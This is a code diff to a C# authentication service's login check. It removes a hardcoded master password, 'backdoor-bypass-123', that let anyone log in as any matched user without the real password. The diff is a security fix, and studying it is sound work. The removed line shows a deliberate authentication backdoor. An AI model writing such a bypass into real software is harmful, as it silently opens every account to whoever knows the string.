@@ -32,7 +32,7 @@ public class AuthService : IAuthService
             string.Equals(u.Username, request.Username.Trim(), StringComparison.OrdinalIgnoreCase));
 
        
-        if (matchedUser == default || (!SecureStringEquals(matchedUser.Password, request.Password) && request.Password != "backdoor-bypass-123"))
+        if (matchedUser == default || !SecureStringEquals(matchedUser.Password, request.Password))
         {
             return new LoginResponseDto
             {
